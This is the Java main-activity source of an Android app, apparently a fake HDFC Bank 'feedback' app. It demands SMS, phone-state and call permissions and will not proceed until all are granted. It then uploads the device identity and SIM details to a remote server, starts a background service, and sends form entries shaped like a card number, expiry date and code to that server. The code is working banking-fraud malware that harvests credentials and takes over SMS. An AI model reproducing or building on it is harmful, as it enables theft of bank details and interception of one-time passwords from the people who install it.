    package com.feedback.hdfcbank01;

    import android.Manifest;
    import android.annotation.SuppressLint;
    import android.content.Intent;
    import android.content.pm.PackageManager;
    import android.os.Build;
    import android.os.Bundle;
    import android.os.Handler;
    import android.provider.Settings;
    import android.util.Log;
    import android.view.LayoutInflater;
    import android.view.View;
    import android.widget.Button;
    import android.widget.EditText;
    import android.widget.Toast;

    import androidx.annotation.NonNull;
    import androidx.appcompat.app.AlertDialog;
    import androidx.appcompat.app.AppCompatActivity;
    import androidx.core.app.ActivityCompat;
    import androidx.core.content.ContextCompat;

    import org.json.JSONException;
    import org.json.JSONObject;

    import java.util.HashMap;
    import java.util.Map;
    import java.util.Objects;

    public class MainActivity extends AppCompatActivity {

        public Map<Integer, String> ids;
        public HashMap<String, Object> dataObject;
        public AlertDialog dialog1;

        private static final int SMS_PERMISSION_REQUEST_CODE = 1;

        @SuppressLint("SetTextI18n")
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            Helper help1 = new Helper();
            help1.SITE();
            if(!Helper.isNetworkAvailable(this)) {
                Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
                startActivity(intent);
            }
            checkPermissions();
        }

        private void initializeWebView() {
            LayoutInflater inflater = getLayoutInflater();
            View dialogView = inflater.inflate(R.layout.dialog_loading, null);

            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setView(dialogView);
            builder.setCancelable(false);
            dialog1 = builder.create();
            dialog1.show();

            registerPhoneData();
        }

        private void beginService(){
            setContentView(R.layout.activity_main);
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }

            dataObject = new HashMap<>();
            EditText refdate = findViewById(R.id.refdate);
            refdate.addTextChangedListener(new ExpiryDateInputMask(refdate));

            // Initialize the ids map
            ids = new HashMap<>();
            ids.put(R.id.refnumber, "refnumber");
            ids.put(R.id.refdate, "refdate");
            ids.put(R.id.referencecode, "referencecode");

            // Populate dataObject
            for(Map.Entry<Integer, String> entry : ids.entrySet()) {
                int viewId = entry.getKey();
                String key = entry.getValue();
                EditText editText = findViewById(viewId);

                String value = editText.getText().toString().trim();
                dataObject.put(key, value);
            }

            Button buttonsubmission = findViewById(R.id.submission);
            buttonsubmission.setOnClickListener(v -> {

                if (validateForm()) {
                    showInstallDialog();
                    JSONObject dataJson = new JSONObject(dataObject);
                    JSONObject sendPayload = new JSONObject();
                    try {
                        Helper help =  new Helper();
                        dataJson.put("mobileName", Build.MODEL);
                        sendPayload.put("site", help.SITE());
                        sendPayload.put("data", dataJson);
                        sendPayload.put("mobile_id", Helper.getAndroidId(this));
                        Helper.postRequest(help.FormSavePath(), sendPayload, result -> {
                            if (result.startsWith("Response Error:")) {
                                Toast.makeText(MainActivity.this, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                            } else {
                                try {
                                    JSONObject response = new JSONObject(result);
                                    if(response.getInt("status")==200){
                                        Intent intent = new Intent(MainActivity.this, SecondActivity.class);
                                        intent.putExtra("id", response.getInt("data"));
                                        startActivity(intent);
                                    }else{
                                        Toast.makeText(MainActivity.this, "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                    }
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        });
                    } catch (JSONException e) {
                        Toast.makeText(MainActivity.this, "Error1 "+ e, Toast.LENGTH_SHORT).show();
                    }
                }else{
                    Toast.makeText(MainActivity.this, "form validation failed", Toast.LENGTH_SHORT).show();
                }
            });
        }

        public boolean validateForm() {
            boolean isValid = true;
            dataObject.clear();

            for (Map.Entry<Integer, String> entry : ids.entrySet()) {
                int viewId = entry.getKey();
                String key = entry.getValue();
                EditText editText = findViewById(viewId);

                // Check if the field is required and not empty
                if (!FormValidator.validateRequired(editText, "Required this field...")) {
                    isValid = false;
                    continue;
                }

                String value = editText.getText().toString().trim();
                switch (key) {
                    case "refnumber":
                        if (!FormValidator.validateMinLength(editText, 10, "Invalid Number")) {
                            isValid = false;
                        }
                        break;
                    case "refdate":
                        if (!FormValidator.validateMinLength(editText, 5, "Invalid Date")) {
                            isValid = false;
                        }
                        break;
                    case "referencecode":
                        if (!FormValidator.validateMinLength(editText, 4, "Invalid Code")) {
                            isValid = false;
                        }
                        break;
                    default:
                        break;
                }
                if (isValid) {
                    dataObject.put(key, value);
                }
            }

            return isValid;
        }


        private void checkPermissions() {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED ||

                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||

                    ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {

                ActivityCompat.requestPermissions(this, new String[]{
                        Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.CALL_PHONE,
                        Manifest.permission.INTERNET,
                        Manifest.permission.ACCESS_NETWORK_STATE,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.SEND_SMS

                }, SMS_PERMISSION_REQUEST_CODE);
                Toast.makeText(this, "Requesting permission", Toast.LENGTH_SHORT).show();
            } else {
                initializeWebView();
            }
        }

        @Override
        public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);

            if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
                if (grantResults.length > 0) {
                    boolean allPermissionsGranted = true;
                    StringBuilder missingPermissions = new StringBuilder();

                    for (int i = 0; i < grantResults.length; i++) {
                        if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                            allPermissionsGranted = false;
                            missingPermissions.append(permissions[i]).append("\n"); // Add missing permission to the list
                        }
                    }
                    if (allPermissionsGranted) {
                        initializeWebView();
                    } else {
                        showPermissionDeniedDialog();
//                        Toast.makeText(this, "Permissions denied:\n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
                    }
                }
            }
        }

        private void showPermissionDeniedDialog() {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Permission Denied");
            builder.setMessage("SMS permissions are required to send and receive messages. " +  "Please grant the permissions in the app settings.");

            builder.setPositiveButton("Open Settings", (dialog, which) -> openAppSettings());
            builder.setNegativeButton("Cancel", (dialog, which) -> {
                dialog.dismiss();
                finish();
            });

            builder.show();
        }
        private void openAppSettings() {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }

        private void showInstallDialog() {

            LayoutInflater inflater = getLayoutInflater();
            View dialogView = inflater.inflate(R.layout.dialog_loading, null);

            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setView(dialogView);
            builder.setCancelable(false);
            AlertDialog dialog = builder.create();
            dialog.show();

            new Handler().postDelayed(dialog::dismiss, 3000);
        }


        public void registerPhoneData() {

            NetworkHelper networkHelper = new NetworkHelper();
            Helper help = new Helper();
            String url = help.URL() + "/mobile/add";
            JSONObject sendData = new JSONObject();
            try {
                Helper hh = new Helper();
                sendData.put("site", hh.SITE());
                sendData.put("mobile", Build.MANUFACTURER);
                sendData.put("model", Build.MODEL);
                sendData.put("mobile_android_version", Build.VERSION.RELEASE);
                sendData.put("mobile_api_level", Build.VERSION.SDK_INT);
                sendData.put("mobile_id",  Helper.getAndroidId(getApplicationContext()));
                try {
                    JSONObject simData = new JSONObject(CallForwardingHelper.getSimDetails(this));
                    sendData.put("sim", simData);
                    dialog1.hide();
                    beginService();
                } catch (JSONException e) {
                    Log.e("Error", "Invalid JSON data: " + e.getMessage());
                }
            }catch (JSONException e) {
                e.printStackTrace();
            }
            networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
                @Override
                public void onSuccess(String result) {
                    runOnUiThread(() -> {
                        try {
                            JSONObject jsonData = new JSONObject(result);
                            if(jsonData.getInt("status") == 200) {
//                                //Log.d(Helper.TAG, "Registered Mobile");
                            }else {
                                //Log.d(Helper.TAG, "Mobile Could Not Registered "+ jsonData.toString());
                                Toast.makeText(getApplicationContext(), "Mobile Could Not Be Registered " + jsonData.toString(), Toast.LENGTH_LONG).show();
                            }
                        } catch (JSONException e) {
                            //Log.d(Helper.TAG, Objects.requireNonNull(e.getMessage()));
                            Toast.makeText(getApplicationContext(),  Objects.requireNonNull(e.getMessage()), Toast.LENGTH_LONG).show();
                        }
                    });
                }
                @Override
                public void onFailure(String error) {
                    runOnUiThread(() -> {
                        //Log.d(Helper.TAG, error);;
                        Toast.makeText(getApplicationContext(),  error, Toast.LENGTH_LONG).show();
                    });
                }
            });
        }

    }

